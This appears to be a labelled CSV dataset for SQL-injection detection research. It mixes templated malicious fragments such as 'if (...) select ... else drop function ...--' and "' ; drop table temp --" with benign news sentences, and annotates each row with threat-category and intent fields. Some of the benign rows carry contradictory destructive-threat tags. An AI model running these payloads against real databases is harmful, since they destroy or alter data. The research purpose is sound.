8705,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,if  (  7340  =  9813  )   select 7340 else drop function yppp--,IF ( 7340 = 9813 ) SELECT 7340 ELSE DROP FUNCTION YPPP--,injection_fragment,SELECT,,,T1,confidentiality,exfiltrate data,exfiltrate data from unknown_table,T1,,False,False,True,True,,,,,,,,,,,,T3,availability/integrity,destroy or alter database structure,destroy or alter database structure,comment_terminated_fragment,availability/integrity,False,False,False,True,False,False,False,False,True,False,,3
4390,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,if  (  7899  =  7899  )   select 7899 else drop function zbbp--,IF ( 7899 = 7899 ) SELECT 7899 ELSE DROP FUNCTION ZBBP--,injection_fragment,SELECT,,,T1,confidentiality,exfiltrate data,exfiltrate data from unknown_table,T1,,False,False,True,True,,,,,,,,,,,,T3,availability/integrity,destroy or alter database structure,destroy or alter database structure,comment_terminated_fragment,availability/integrity,False,False,False,True,False,False,False,False,True,False,,3
5379,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,if  (  8995  =  9787  )   select 8995 else drop function ofgg--,IF ( 8995 = 9787 ) SELECT 8995 ELSE DROP FUNCTION OFGG--,injection_fragment,SELECT,,,T1,confidentiality,exfiltrate data,exfiltrate data from unknown_table,T1,,False,False,True,True,,,,,,,,,,,,T3,availability/integrity,destroy or alter database structure,destroy or alter database structure,comment_terminated_fragment,availability/integrity,False,False,False,True,False,False,False,False,True,False,,3
33813,sqliv2,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\sqliv2.csv,0,Oil extends drop toward $ 96 barrel The price oil continued fall Friday concerns high supplies offset report showing China &apos;s power-hungry manufacturing sector strengthening,OIL EXTENDS DROP TOWARD $ 96 BARREL THE PRICE OIL CONTINUED FALL FRIDAY CONCERNS HIGH SUPPLIES OFFSET REPORT SHOWING CHINA &APOS;S POWER-HUNGRY MANUFACTURING SECTOR STRENGTHENING,injection_fragment,DROP,,,B,legitimate,perform legitimate write operation,perform legitimate write operation,B,,False,False,True,True,,,,,,,,,,,,T3,availability/integrity,destroy or alter database structure,destroy or alter database structure,stacked_write_or_ddl_fragment,availability/integrity,False,False,True,False,False,False,False,False,True,False,,3
11004,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,if  (  1665  =  3845  )   select 1665 else drop function nzod--,IF ( 1665 = 3845 ) SELECT 1665 ELSE DROP FUNCTION NZOD--,injection_fragment,SELECT,,,T1,confidentiality,exfiltrate data,exfiltrate data from unknown_table,T1,,False,False,True,True,,,,,,,,,,,,T3,availability/integrity,destroy or alter database structure,destroy or alter database structure,comment_terminated_fragment,availability/integrity,False,False,False,True,False,False,False,False,True,False,,3
7038,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,if  (  4194  =  4133  )   select 4194 else drop function tqhz--,IF ( 4194 = 4133 ) SELECT 4194 ELSE DROP FUNCTION TQHZ--,injection_fragment,SELECT,,,T1,confidentiality,exfiltrate data,exfiltrate data from unknown_table,T1,,False,False,True,True,,,,,,,,,,,,T3,availability/integrity,destroy or alter database structure,destroy or alter database structure,comment_terminated_fragment,availability/integrity,False,False,False,True,False,False,False,False,True,False,,3
31417,sqliv2,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\sqliv2.csv,1,' ; drop table temp --,' ; DROP TABLE TEMP --,injection_fragment,UNKNOWN,temp,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,False,True,,,,,,,,,,,,T3,availability/integrity,destroy or alter database structure,destroy or alter database structure,stacked_write_or_ddl_fragment,availability/integrity,False,False,True,True,False,False,False,True,False,False,temp,3
4101,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,if  (  8264  =  1939  )   select 8264 else drop function nsoq--,IF ( 8264 = 1939 ) SELECT 8264 ELSE DROP FUNCTION NSOQ--,injection_fragment,SELECT,,,T1,confidentiality,exfiltrate data,exfiltrate data from unknown_table,T1,,False,False,True,True,,,,,,,,,,,,T3,availability/integrity,destroy or alter database structure,destroy or alter database structure,comment_terminated_fragment,availability/integrity,False,False,False,True,False,False,False,False,True,False,,3
34241,sqliv2,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\sqliv2.csv,0,"Soon drop , Scarborough regular phone contact Ditta dinner Blackburn Rovers football stadium , Ewood Park","SOON DROP , SCARBOROUGH REGULAR PHONE CONTACT DITTA DINNER BLACKBURN ROVERS FOOTBALL STADIUM , EWOOD PARK",injection_fragment,DROP,,,B,legitimate,perform legitimate write operation,perform legitimate write operation,B,,False,False,True,True,,,,,,,,,,,,T3,availability/integrity,destroy or alter database structure,destroy or alter database structure,ddl_fragment,availability/integrity,False,False,False,False,False,False,False,False,True,False,,3
1375,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,if  (  3490  =  4920  )   select 3490 else drop function hlzt--,IF ( 3490 = 4920 ) SELECT 3490 ELSE DROP FUNCTION HLZT--,injection_fragment,SELECT,,,T1,confidentiality,exfiltrate data,exfiltrate data from unknown_table,T1,,False,False,True,True,,,,,,,,,,,,T3,availability/integrity,destroy or alter database structure,destroy or alter database structure,comment_terminated_fragment,availability/integrity,False,False,False,True,False,False,False,False,True,False,,3
8798,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,if  (  9770  =  9748  )   select 9770 else drop function zyuo--,IF ( 9770 = 9748 ) SELECT 9770 ELSE DROP FUNCTION ZYUO--,injection_fragment,SELECT,,,T1,confidentiality,exfiltrate data,exfiltrate data from unknown_table,T1,,False,False,True,True,,,,,,,,,,,,T3,availability/integrity,destroy or alter database structure,destroy or alter database structure,comment_terminated_fragment,availability/integrity,False,False,False,True,False,False,False,False,True,False,,3
9103,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,if  (  5316  =  4416  )   select 5316 else drop function vtve--,IF ( 5316 = 4416 ) SELECT 5316 ELSE DROP FUNCTION VTVE--,injection_fragment,SELECT,,,T1,confidentiality,exfiltrate data,exfiltrate data from unknown_table,T1,,False,False,True,True,,,,,,,,,,,,T3,availability/integrity,destroy or alter database structure,destroy or alter database structure,comment_terminated_fragment,availability/integrity,False,False,False,True,False,False,False,False,True,False,,3
2784,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,if  (  4735  =  8907  )   select 4735 else drop function qigo--,IF ( 4735 = 8907 ) SELECT 4735 ELSE DROP FUNCTION QIGO--,injection_fragment,SELECT,,,T1,confidentiality,exfiltrate data,exfiltrate data from unknown_table,T1,,False,False,True,True,,,,,,,,,,,,T3,availability/integrity,destroy or alter database structure,destroy or alter database structure,comment_terminated_fragment,availability/integrity,False,False,False,True,False,False,False,False,True,False,,3
5323,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,if  (  2695  =  9045  )   select 2695 else drop function qmno--,IF ( 2695 = 9045 ) SELECT 2695 ELSE DROP FUNCTION QMNO--,injection_fragment,SELECT,,,T1,confidentiality,exfiltrate data,exfiltrate data from unknown_table,T1,,False,False,True,True,,,,,,,,,,,,T3,availability/integrity,destroy or alter database structure,destroy or alter database structure,comment_terminated_fragment,availability/integrity,False,False,False,True,False,False,False,False,True,False,,3
2379,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,if  (  1087  =  5839  )   select 1087 else drop function zzeh--,IF ( 1087 = 5839 ) SELECT 1087 ELSE DROP FUNCTION ZZEH--,injection_fragment,SELECT,,,T1,confidentiality,exfiltrate data,exfiltrate data from unknown_table,T1,,False,False,True,True,,,,,,,,,,,,T3,availability/integrity,destroy or alter database structure,destroy or alter database structure,comment_terminated_fragment,availability/integrity,False,False,False,True,False,False,False,False,True,False,,3
1627,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,if  (  8537  =  7034  )   select 8537 else drop function vqmp--,IF ( 8537 = 7034 ) SELECT 8537 ELSE DROP FUNCTION VQMP--,injection_fragment,SELECT,,,T1,confidentiality,exfiltrate data,exfiltrate data from unknown_table,T1,,False,False,True,True,,,,,,,,,,,,T3,availability/integrity,destroy or alter database structure,destroy or alter database structure,comment_terminated_fragment,availability/integrity,False,False,False,True,False,False,False,False,True,False,,3
33261,sqliv2,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\sqliv2.csv,0,"&quot; Cell phones , really issue , potentially could create interference navigational devices , know , according FCC , could interfere cell phone towers &apos;re air , &quot; Rosenker said","&QUOT; CELL PHONES , REALLY ISSUE , POTENTIALLY COULD CREATE INTERFERENCE NAVIGATIONAL DEVICES , KNOW , ACCORDING FCC , COULD INTERFERE CELL PHONE TOWERS &APOS;RE AIR , &QUOT; ROSENKER SAID",injection_fragment,UNKNOWN,,,B,legitimate,unknown legitimate action,unknown legitimate action,B,,True,False,True,True,,,,,,,,,,,,T3,availability/integrity,destroy or alter database structure,destroy or alter database structure,stacked_write_or_ddl_fragment,availability/integrity,False,False,True,False,False,False,False,True,True,False,,3
7165,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,if  (  5127  =  2829  )   select 5127 else drop function okos--,IF ( 5127 = 2829 ) SELECT 5127 ELSE DROP FUNCTION OKOS--,injection_fragment,SELECT,,,T1,confidentiality,exfiltrate data,exfiltrate data from unknown_table,T1,,False,False,True,True,,,,,,,,,,,,T3,availability/integrity,destroy or alter database structure,destroy or alter database structure,comment_terminated_fragment,availability/integrity,False,False,False,True,False,False,False,False,True,False,,3
32795,sqliv2,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\sqliv2.csv,0,"Pope Francis name first cardinals February Pope Francis create new cardinals Catholic Church first time February 22 , Vatican announced Thursday","POPE FRANCIS NAME FIRST CARDINALS FEBRUARY POPE FRANCIS CREATE NEW CARDINALS CATHOLIC CHURCH FIRST TIME FEBRUARY 22 , VATICAN ANNOUNCED THURSDAY",injection_fragment,CREATE,,,B,legitimate,perform legitimate write operation,perform legitimate write operation,B,,False,False,True,True,,,,,,,,,,,,T3,availability/integrity,destroy or alter database structure,destroy or alter database structure,ddl_fragment,availability/integrity,False,False,False,False,False,False,False,False,True,False,,3
32641,sqliv2,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\sqliv2.csv,0,"What Le Pen newfound popularity among French white , working class ? She wants use next year &apos;s EU elections create anti-EU , anti-common currency bloc across European Parliament","WHAT LE PEN NEWFOUND POPULARITY AMONG FRENCH WHITE , WORKING CLASS ? SHE WANTS USE NEXT YEAR &APOS;S EU ELECTIONS CREATE ANTI-EU , ANTI-COMMON CURRENCY BLOC ACROSS EUROPEAN PARLIAMENT",injection_fragment,UNKNOWN,,,B,legitimate,unknown legitimate action,unknown legitimate action,B,,True,False,True,True,,,,,,,,,,,,T3,availability/integrity,destroy or alter database structure,destroy or alter database structure,stacked_write_or_ddl_fragment,availability/integrity,False,False,True,False,False,False,False,True,True,False,,3
34478,sqliv2,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\sqliv2.csv,0,The goal adjustment create relaxing atmosphere,THE GOAL ADJUSTMENT CREATE RELAXING ATMOSPHERE,injection_fragment,CREATE,,,B,legitimate,perform legitimate write operation,perform legitimate write operation,B,,False,False,True,True,,,,,,,,,,,,T3,availability/integrity,destroy or alter database structure,destroy or alter database structure,ddl_fragment,availability/integrity,False,False,False,False,False,False,False,False,True,False,,3
4776,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,if  (  7427  =  7800  )   select 7427 else drop function dgir--,IF ( 7427 = 7800 ) SELECT 7427 ELSE DROP FUNCTION DGIR--,injection_fragment,SELECT,,,T1,confidentiality,exfiltrate data,exfiltrate data from unknown_table,T1,,False,False,True,True,,,,,,,,,,,,T3,availability/integrity,destroy or alter database structure,destroy or alter database structure,comment_terminated_fragment,availability/integrity,False,False,False,True,False,False,False,False,True,False,,3
3080,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,if  (  9431  =  6730  )   select 9431 else drop function xbkh--,IF ( 9431 = 6730 ) SELECT 9431 ELSE DROP FUNCTION XBKH--,injection_fragment,SELECT,,,T1,confidentiality,exfiltrate data,exfiltrate data from unknown_table,T1,,False,False,True,True,,,,,,,,,,,,T3,availability/integrity,destroy or alter database structure,destroy or alter database structure,comment_terminated_fragment,availability/integrity,False,False,False,True,False,False,False,False,True,False,,3
5304,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,if  (  4135  =  2165  )   select 4135 else drop function otyy--,IF ( 4135 = 2165 ) SELECT 4135 ELSE DROP FUNCTION OTYY--,injection_fragment,SELECT,,,T1,confidentiality,exfiltrate data,exfiltrate data from unknown_table,T1,,False,False,True,True,,,,,,,,,,,,T3,availability/integrity,destroy or alter database structure,destroy or alter database structure,comment_terminated_fragment,availability/integrity,False,False,False,True,False,False,False,False,True,False,,3
6675,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,if  (  2697  =  2008  )   select 2697 else drop function jcoo--,IF ( 2697 = 2008 ) SELECT 2697 ELSE DROP FUNCTION JCOO--,injection_fragment,SELECT,,,T1,confidentiality,exfiltrate data,exfiltrate data from unknown_table,T1,,False,False,True,True,,,,,,,,,,,,T3,availability/integrity,destroy or alter database structure,destroy or alter database structure,comment_terminated_fragment,availability/integrity,False,False,False,True,False,False,False,False,True,False,,3
8078,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,if  (  6624  =  4232  )   select 6624 else drop function xyyt--,IF ( 6624 = 4232 ) SELECT 6624 ELSE DROP FUNCTION XYYT--,injection_fragment,SELECT,,,T1,confidentiality,exfiltrate data,exfiltrate data from unknown_table,T1,,False,False,True,True,,,,,,,,,,,,T3,availability/integrity,destroy or alter database structure,destroy or alter database structure,comment_terminated_fragment,availability/integrity,False,False,False,True,False,False,False,False,True,False,,3
9510,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,if  (  6767  =  5022  )   select 6767 else drop function buii--,IF ( 6767 = 5022 ) SELECT 6767 ELSE DROP FUNCTION BUII--,injection_fragment,SELECT,,,T1,confidentiality,exfiltrate data,exfiltrate data from unknown_table,T1,,False,False,True,True,,,,,,,,,,,,T3,availability/integrity,destroy or alter database structure,destroy or alter database structure,comment_terminated_fragment,availability/integrity,False,False,False,True,False,False,False,False,True,False,,3
6893,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,if  (  3245  =  6168  )   select 3245 else drop function nafj--,IF ( 3245 = 6168 ) SELECT 3245 ELSE DROP FUNCTION NAFJ--,injection_fragment,SELECT,,,T1,confidentiality,exfiltrate data,exfiltrate data from unknown_table,T1,,False,False,True,True,,,,,,,,,,,,T3,availability/integrity,destroy or alter database structure,destroy or alter database structure,comment_terminated_fragment,availability/integrity,False,False,False,True,False,False,False,False,True,False,,3
3674,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,if  (  1928  =  4811  )   select 1928 else drop function ucko--,IF ( 1928 = 4811 ) SELECT 1928 ELSE DROP FUNCTION UCKO--,injection_fragment,SELECT,,,T1,confidentiality,exfiltrate data,exfiltrate data from unknown_table,T1,,False,False,True,True,,,,,,,,,,,,T3,availability/integrity,destroy or alter database structure,destroy or alter database structure,comment_terminated_fragment,availability/integrity,False,False,False,True,False,False,False,False,True,False,,3
930,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,if  (  8284  =  6171  )   select 8284 else drop function mbih--,IF ( 8284 = 6171 ) SELECT 8284 ELSE DROP FUNCTION MBIH--,injection_fragment,SELECT,,,T1,confidentiality,exfiltrate data,exfiltrate data from unknown_table,T1,,False,False,True,True,,,,,,,,,,,,T3,availability/integrity,destroy or alter database structure,destroy or alter database structure,comment_terminated_fragment,availability/integrity,False,False,False,True,False,False,False,False,True,False,,3
33783,sqliv2,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\sqliv2.csv,0,The majority users parking garage therefore hurry past Roman relics simply drop car,THE MAJORITY USERS PARKING GARAGE THEREFORE HURRY PAST ROMAN RELICS SIMPLY DROP CAR,injection_fragment,DROP,,,B,legitimate,perform legitimate write operation,perform legitimate write operation,B,,False,False,True,True,,,,,,,,,,,,T3,availability/integrity,destroy or alter database structure,destroy or alter database structure,ddl_fragment,availability/integrity,False,False,False,False,False,False,False,False,True,False,,3
9368,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,if  (  8182  =  3225  )   select 8182 else drop function kpzk--,IF ( 8182 = 3225 ) SELECT 8182 ELSE DROP FUNCTION KPZK--,injection_fragment,SELECT,,,T1,confidentiality,exfiltrate data,exfiltrate data from unknown_table,T1,,False,False,True,True,,,,,,,,,,,,T3,availability/integrity,destroy or alter database structure,destroy or alter database structure,comment_terminated_fragment,availability/integrity,False,False,False,True,False,False,False,False,True,False,,3
7708,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,if  (  2823  =  3532  )   select 2823 else drop function kmqw--,IF ( 2823 = 3532 ) SELECT 2823 ELSE DROP FUNCTION KMQW--,injection_fragment,SELECT,,,T1,confidentiality,exfiltrate data,exfiltrate data from unknown_table,T1,,False,False,True,True,,,,,,,,,,,,T3,availability/integrity,destroy or alter database structure,destroy or alter database structure,comment_terminated_fragment,availability/integrity,False,False,False,True,False,False,False,False,True,False,,3
10127,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,if  (  3392  =  4422  )   select 3392 else drop function xsqq--,IF ( 3392 = 4422 ) SELECT 3392 ELSE DROP FUNCTION XSQQ--,injection_fragment,SELECT,,,T1,confidentiality,exfiltrate data,exfiltrate data from unknown_table,T1,,False,False,True,True,,,,,,,,,,,,T3,availability/integrity,destroy or alter database structure,destroy or alter database structure,comment_terminated_fragment,availability/integrity,False,False,False,True,False,False,False,False,True,False,,3
970,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,if  (  8858  =  5680  )   select 8858 else drop function pyuo--,IF ( 8858 = 5680 ) SELECT 8858 ELSE DROP FUNCTION PYUO--,injection_fragment,SELECT,,,T1,confidentiality,exfiltrate data,exfiltrate data from unknown_table,T1,,False,False,True,True,,,,,,,,,,,,T3,availability/integrity,destroy or alter database structure,destroy or alter database structure,comment_terminated_fragment,availability/integrity,False,False,False,True,False,False,False,False,True,False,,3
5805,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,if  (  6842  =  5446  )   select 6842 else drop function vjfq--,IF ( 6842 = 5446 ) SELECT 6842 ELSE DROP FUNCTION VJFQ--,injection_fragment,SELECT,,,T1,confidentiality,exfiltrate data,exfiltrate data from unknown_table,T1,,False,False,True,True,,,,,,,,,,,,T3,availability/integrity,destroy or alter database structure,destroy or alter database structure,comment_terminated_fragment,availability/integrity,False,False,False,True,False,False,False,False,True,False,,3
1373,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,if  (  3831  =  9321  )   select 3831 else drop function ybru--,IF ( 3831 = 9321 ) SELECT 3831 ELSE DROP FUNCTION YBRU--,injection_fragment,SELECT,,,T1,confidentiality,exfiltrate data,exfiltrate data from unknown_table,T1,,False,False,True,True,,,,,,,,,,,,T3,availability/integrity,destroy or alter database structure,destroy or alter database structure,comment_terminated_fragment,availability/integrity,False,False,False,True,False,False,False,False,True,False,,3
34052,sqliv2,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\sqliv2.csv,0,"The unavailable punctuations sentence boundaries transcribed speech texts create barriers many subsequent processing tasks, summarization, information extraction, question answering machine translation","THE UNAVAILABLE PUNCTUATIONS SENTENCE BOUNDARIES TRANSCRIBED SPEECH TEXTS CREATE BARRIERS MANY SUBSEQUENT PROCESSING TASKS, SUMMARIZATION, INFORMATION EXTRACTION, QUESTION ANSWERING MACHINE TRANSLATION",injection_fragment,CREATE,,,B,legitimate,perform legitimate write operation,perform legitimate write operation,B,,False,False,True,True,,,,,,,,,,,,T3,availability/integrity,destroy or alter database structure,destroy or alter database structure,ddl_fragment,availability/integrity,False,False,False,False,False,False,False,False,True,False,,3
10102,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,if  (  8812  =  7896  )   select 8812 else drop function xltk--,IF ( 8812 = 7896 ) SELECT 8812 ELSE DROP FUNCTION XLTK--,injection_fragment,SELECT,,,T1,confidentiality,exfiltrate data,exfiltrate data from unknown_table,T1,,False,False,True,True,,,,,,,,,,,,T3,availability/integrity,destroy or alter database structure,destroy or alter database structure,comment_terminated_fragment,availability/integrity,False,False,False,True,False,False,False,False,True,False,,3
9262,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,if  (  8727  =  4039  )   select 8727 else drop function giql--,IF ( 8727 = 4039 ) SELECT 8727 ELSE DROP FUNCTION GIQL--,injection_fragment,SELECT,,,T1,confidentiality,exfiltrate data,exfiltrate data from unknown_table,T1,,False,False,True,True,,,,,,,,,,,,T3,availability/integrity,destroy or alter database structure,destroy or alter database structure,comment_terminated_fragment,availability/integrity,False,False,False,True,False,False,False,False,True,False,,3
6220,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,if  (  6554  =  1534  )   select 6554 else drop function buqb--,IF ( 6554 = 1534 ) SELECT 6554 ELSE DROP FUNCTION BUQB--,injection_fragment,SELECT,,,T1,confidentiality,exfiltrate data,exfiltrate data from unknown_table,T1,,False,False,True,True,,,,,,,,,,,,T3,availability/integrity,destroy or alter database structure,destroy or alter database structure,comment_terminated_fragment,availability/integrity,False,False,False,True,False,False,False,False,True,False,,3
32022,sqliv2,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\sqliv2.csv,0,The objective create clear view viewpoint,THE OBJECTIVE CREATE CLEAR VIEW VIEWPOINT,injection_fragment,CREATE,,,B,legitimate,perform legitimate write operation,perform legitimate write operation,B,,False,False,True,True,,,,,,,,,,,,T3,availability/integrity,destroy or alter database structure,destroy or alter database structure,ddl_fragment,availability/integrity,False,False,False,False,False,False,False,False,True,False,,3
3502,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,if  (  6745  =  4078  )   select 6745 else drop function ytyt--,IF ( 6745 = 4078 ) SELECT 6745 ELSE DROP FUNCTION YTYT--,injection_fragment,SELECT,,,T1,confidentiality,exfiltrate data,exfiltrate data from unknown_table,T1,,False,False,True,True,,,,,,,,,,,,T3,availability/integrity,destroy or alter database structure,destroy or alter database structure,comment_terminated_fragment,availability/integrity,False,False,False,True,False,False,False,False,True,False,,3
5940,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,if  (  6647  =  2179  )   select 6647 else drop function zvlq--,IF ( 6647 = 2179 ) SELECT 6647 ELSE DROP FUNCTION ZVLQ--,injection_fragment,SELECT,,,T1,confidentiality,exfiltrate data,exfiltrate data from unknown_table,T1,,False,False,True,True,,,,,,,,,,,,T3,availability/integrity,destroy or alter database structure,destroy or alter database structure,comment_terminated_fragment,availability/integrity,False,False,False,True,False,False,False,False,True,False,,3
5377,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,if  (  3593  =  3779  )   select 3593 else drop function qtqy--,IF ( 3593 = 3779 ) SELECT 3593 ELSE DROP FUNCTION QTQY--,injection_fragment,SELECT,,,T1,confidentiality,exfiltrate data,exfiltrate data from unknown_table,T1,,False,False,True,True,,,,,,,,,,,,T3,availability/integrity,destroy or alter database structure,destroy or alter database structure,comment_terminated_fragment,availability/integrity,False,False,False,True,False,False,False,False,True,False,,3
34718,sqliv2,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\sqliv2.csv,0,"In New York City , transportation officials seeking develop taxing device would also equipped pay parking meter fees , provide &quot; pay-as-you-drive &quot; insurance , create pool real-time speed data drivers motorists could use avoid traffic","IN NEW YORK CITY , TRANSPORTATION OFFICIALS SEEKING DEVELOP TAXING DEVICE WOULD ALSO EQUIPPED PAY PARKING METER FEES , PROVIDE &QUOT; PAY-AS-YOU-DRIVE &QUOT; INSURANCE , CREATE POOL REAL-TIME SPEED DATA DRIVERS MOTORISTS COULD USE AVOID TRAFFIC",injection_fragment,UNKNOWN,,,B,legitimate,unknown legitimate action,unknown legitimate action,B,,True,False,True,True,,,,,,,,,,,,T3,availability/integrity,destroy or alter database structure,destroy or alter database structure,stacked_write_or_ddl_fragment,availability/integrity,False,False,True,False,False,False,False,True,True,False,,3
5416,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,if  (  9690  =  6491  )   select 9690 else drop function nyln--,IF ( 9690 = 6491 ) SELECT 9690 ELSE DROP FUNCTION NYLN--,injection_fragment,SELECT,,,T1,confidentiality,exfiltrate data,exfiltrate data from unknown_table,T1,,False,False,True,True,,,,,,,,,,,,T3,availability/integrity,destroy or alter database structure,destroy or alter database structure,comment_terminated_fragment,availability/integrity,False,False,False,True,False,False,False,False,True,False,,3
2690,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,if  (  9953  =  4347  )   select 9953 else drop function ocau--,IF ( 9953 = 4347 ) SELECT 9953 ELSE DROP FUNCTION OCAU--,injection_fragment,SELECT,,,T1,confidentiality,exfiltrate data,exfiltrate data from unknown_table,T1,,False,False,True,True,,,,,,,,,,,,T3,availability/integrity,destroy or alter database structure,destroy or alter database structure,comment_terminated_fragment,availability/integrity,False,False,False,True,False,False,False,False,True,False,,3
30209,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,0,FROM  ( SELECT DISTINCT sit FROM create ),FROM ( SELECT DISTINCT SIT FROM CREATE ),injection_fragment,UNKNOWN,"create, ( select distinct sit from create )",sit,B,legitimate,unknown legitimate action,unknown legitimate action,B,,True,False,False,True,,,,,,,,,,,,T3,availability/integrity,destroy or alter database structure,destroy or alter database structure,subquery_fragment,availability/integrity,False,True,False,False,False,False,False,True,False,False,create,3
4673,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,if  (  8574  =  7534  )   select 8574 else drop function nxbe--,IF ( 8574 = 7534 ) SELECT 8574 ELSE DROP FUNCTION NXBE--,injection_fragment,SELECT,,,T1,confidentiality,exfiltrate data,exfiltrate data from unknown_table,T1,,False,False,True,True,,,,,,,,,,,,T3,availability/integrity,destroy or alter database structure,destroy or alter database structure,comment_terminated_fragment,availability/integrity,False,False,False,True,False,False,False,False,True,False,,3
7653,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,if  (  4947  =  5350  )   select 4947 else drop function ereg--,IF ( 4947 = 5350 ) SELECT 4947 ELSE DROP FUNCTION EREG--,injection_fragment,SELECT,,,T1,confidentiality,exfiltrate data,exfiltrate data from unknown_table,T1,,False,False,True,True,,,,,,,,,,,,T3,availability/integrity,destroy or alter database structure,destroy or alter database structure,comment_terminated_fragment,availability/integrity,False,False,False,True,False,False,False,False,True,False,,3
34054,sqliv2,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\sqliv2.csv,0,There always domestic opposition plan create federal Europe,THERE ALWAYS DOMESTIC OPPOSITION PLAN CREATE FEDERAL EUROPE,injection_fragment,CREATE,,,B,legitimate,perform legitimate write operation,perform legitimate write operation,B,,False,False,True,True,,,,,,,,,,,,T3,availability/integrity,destroy or alter database structure,destroy or alter database structure,ddl_fragment,availability/integrity,False,False,False,False,False,False,False,False,True,False,,3
